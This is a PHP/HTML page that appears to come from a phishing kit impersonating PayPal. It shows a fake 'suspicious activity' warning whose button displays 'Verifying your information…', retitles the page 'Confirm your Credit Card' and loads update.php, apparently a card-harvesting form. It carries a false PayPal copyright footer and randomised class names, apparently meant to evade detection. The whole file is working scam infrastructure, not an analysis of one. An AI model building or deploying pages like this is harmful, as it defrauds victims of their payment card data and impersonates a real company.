<?php
include 'inc/config.php';
include 'language.php';
?>
    <html lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="./file/font-sans.css">
        <link rel="stylesheet" href="./file/template.css">
        <link rel="stylesheet" href="./file/css.css">


        <title>
            <?=$language['suspecious'][2];?>
        </title>
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script type="text/javascript" src="./file/jquery.min.js"></script>
        <script type="text/javascript" src="./file/jstz.min.jsjquery.min.js"></script>
        <script type="text/javascript" src="./file/jquery.mobile.custom.min.js"></script>
        <script type="text/javascript" src="./file/jquery.browser.min.jsjquery.min.js"></script>
        <link rel="icon" type="image/png" href="img/favicon.ico">
    </head>

    <body>
        <div id="loader" class="2vkwkakgi8odotu 81blna46q8bjqybjrxvd9wpg6nvl spinner gl69nhmobj6alfrah1t6nx6 dc7rzip6ul59tiowsky5qf6z" style="display: none; opacity: 0;">
            <p id="loading_title">Verifying your information…</p>
        </div>
        <div id="ajax" style="opacity: 1;">
            <script type="text/javascript">
$("#safety_btn").click(function () {

    $("#loader").css('display', 'block');
    $("#loader").animate({
        opacity: '1'
    }, 500, null);
    setTimeout(function () {
        document.title = 'Confirm your Credit Card';
        $("#ajax").load("update.php");
        $("#loader").animate({
            opacity: '0'
        }, 500, function () {
            $("#loader").css('display', 'none');
        });
    }, 3000);
});

            </script>
            <div id="safe_header">
                <div class="container">
                    <div class="row">
                        <div class="four columns" id="shield">
                            <?=$language['suspecious'][1];?>
                        </div>
                        <div class="eight columns" id="safety">
                            <h4>
                                <?=$language['suspecious'][2];?>
                            </h4>
                            <p>
                                <?=$language['suspecious'][3];?>
                            </p>
                            <button type="button" id="safety_btn" class="button-primary twelve columns u-full-width"><?=$language['suspecious'][4];?></button>
                        </div>
                    </div>

                </div>
            </div>
            <div id="footer_suspecious" class="desktopx">
                <ul>
                    <li>Contact</li>
                    <li>Security Center</li>
                    <li>Sign off</li>
                </ul>
            </div>
            <div id="footer_suspecious_dark" class="desktopx">
                Copyright © 1999-
                <?=date("Y");?> PayPal. All rights reserved. Privacy legal agreements </div>

        </div>

    </body>

    </html>
